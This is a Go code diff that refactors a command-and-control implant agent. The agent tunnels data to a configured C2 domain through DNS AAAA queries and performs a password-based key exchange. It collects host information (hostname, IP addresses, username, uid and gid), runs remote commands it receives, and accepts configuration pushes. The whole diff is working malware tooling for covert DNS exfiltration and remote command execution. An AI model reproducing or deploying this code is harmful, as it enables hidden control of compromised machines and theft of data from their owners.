@@ -135,7 +135,8 @@ func (a *Agent) SendEncrypted(message []byte, command AgentCommand) {
 		data = message
 	} else {
 		commandResponse := &Command_Response{}
-		commandResponse.Output = message
+		commandResponse.Command = AgentCommand_AGENT_KEYX
+		commandResponse.Data = message
 		commandResponse.Status = AgentCommandStatus_COMMAND_STATUS_SUCCESS
 		commandResponseProto, marshalError := proto.Marshal(commandResponse)
 		if marshalError != nil {
@@ -170,7 +171,7 @@ func (a *Agent) Keyx() {
 func (a *Agent) QueueData(command AgentCommand, bytes []byte) {
 	data := BytesToHexString(bytes)
 
-	chunks := chunkString(data, SENDQ_CHUNK_LEN)
+	chunks := ChunkString(data, SENDQ_CHUNK_LEN)
 	totalChunks := len(chunks)
 
 	// unique-ish identifier for each sent command to aide in reconstruction
@@ -236,12 +237,11 @@ func (a *Agent) ProcessSendQ() {
 	}
 
 	for sendQItem := range a.sendq {
-		// first 4 bytes will be randomized for every request to prevent dns caching
+		// first 2 bytes will be randomized for every request to prevent dns caching
 		antiCacheValue := a.crypto.RandomHexString(4)
 		query := antiCacheValue + "." + sendQItem + "." + a.config.C2Domain
 
 		// var err error
-		var c2Response []string
 
 		dnsMessage := new(dns.Msg)
 		dnsMessage.SetQuestion(query+".", dns.TypeAAAA)
@@ -249,6 +249,8 @@ func (a *Agent) ProcessSendQ() {
 		dnsClient := new(dns.Client)
 		dnsResponse, _, err := dnsClient.Exchange(dnsMessage, a.config.Resolver)
 		// log.Printf("raw: %s %s %s", in, rtt, err)
+
+		var c2Response []string
 		if err != nil {
 			// fmt.Printf("Error getting the IPv6 address: %s\n", err)
 		} else if dnsResponse.Rcode != dns.RcodeSuccess {
@@ -437,6 +439,7 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_
 	log.Printf("processed recv: %d: %x\n", command, data)
 	delete(a.recvq, command)
 
+	// keyx commands are not encrypted
 	if command == AgentCommand_AGENT_KEYX {
 		commandRequest, unmarshalError := unmarshalCommandRequest(data)
 		if unmarshalError != nil {
@@ -444,7 +447,7 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_
 			return
 		}
 
-		err := a.crypto.ComputeSharedSecret(commandRequest.Input, a.config.C2Password)
+		err := a.crypto.ComputeSharedSecret(commandRequest.Data, a.config.C2Password)
 		if err != nil {
 			log.Printf("failed to compute secret with pubkey: %x (err: %q)\n", data, err)
 			return
@@ -464,13 +467,18 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_
 		log.Printf("failed unmarshal command request: %x (err: %q)\n", data, unmarshalError)
 		return
 	}
-	decryptedData = commandRequest.Input
+	decryptedData = commandRequest.Data
 
 	switch command {
 	case AgentCommand_AGENT_SYSINFO:
-		var sysinfo = a.GetSysInfo()
-		log.Printf("sysinfo: %s\n", sysinfo)
-		a.SendEncrypted([]byte(sysinfo), AgentCommand_AGENT_SYSINFO)
+		var sysinfoData = a.GetSysInfo()
+		log.Printf("sysinfo: %+v\n", sysinfoData)
+		sysinfoProto, marshalError := proto.Marshal(sysinfoData)
+		if marshalError != nil {
+			log.Printf("failed marshal command response: %x (err: %q)\n", sysinfoData, marshalError)
+			return
+		}
+		a.SendEncrypted([]byte(sysinfoProto), AgentCommand_AGENT_SYSINFO)
 		break
 	case AgentCommand_AGENT_EXECUTE:
 		cmd := string(decryptedData)
@@ -487,8 +495,13 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_
 		}()
 		break
 	case AgentCommand_AGENT_SET_CONFIG:
-		newConfig := commandRequest.Config
-		log.Printf("incoming agent config update: %s\n", commandRequest.GetConfig())
+		newConfig, unmarshalError := unmarshalAgentConfig(decryptedData)
+		if unmarshalError != nil {
+			log.Printf("failed unmarshal set config proto: %x (err: %q)\n", decryptedData, unmarshalError)
+			return
+		}
+
+		log.Printf("incoming agent config update: %s\n", decryptedData)
 		if newConfig.GetWebKey() != nil {
 			a.config.ProxyKey = newConfig.WebKey.Value
 		}
@@ -609,38 +622,33 @@ func (a *Agent) NewAgentID() {
 	}
 }
 
-func (a *Agent) GetSysInfo() string {
-	var sysinfo = ""
+func (a *Agent) GetSysInfo() *SysInfoData {
+	var sysinfo = &SysInfoData{}
 
-	var name, err = os.Hostname()
-	if err != nil {
-		name = "_"
+	var hostname, err = os.Hostname()
+	if err == nil {
+		sysinfo.Hostname = hostname
 	}
 
-	var ips = ""
 	interfaceAddresses, err := net.InterfaceAddrs()
-	if err != nil {
-		ips = "_"
-	}
-
-	for _, a := range interfaceAddresses {
-		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
-			if ipnet.IP.To4() != nil {
-				ip := ipnet.IP.String()
-				if !strings.HasPrefix(ip, "169.254.") {
-					ips = ips + ip + ","
+	if err == nil {
+		for _, a := range interfaceAddresses {
+			if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
+				if ipnet.IP.To4() != nil {
+					ip := ipnet.IP.String()
+					if !strings.HasPrefix(ip, "169.254.") {
+						sysinfo.Ip = append(sysinfo.Ip, ip)
+					}
 				}
 			}
 		}
 	}
 
-	var username = ""
-	u, err := user.Current()
-	if err != nil {
-		username = "_"
-	} else {
-		username = u.Username + ":" + u.Uid + ":" + u.Gid
+	currentUser, err := user.Current()
+	if err == nil {
+		sysinfo.User = currentUser.Username
+		sysinfo.Uid = currentUser.Uid
+		sysinfo.Gid = currentUser.Gid
 	}
-	sysinfo = name + ";" + ips + ";" + username
 	return sysinfo
 }
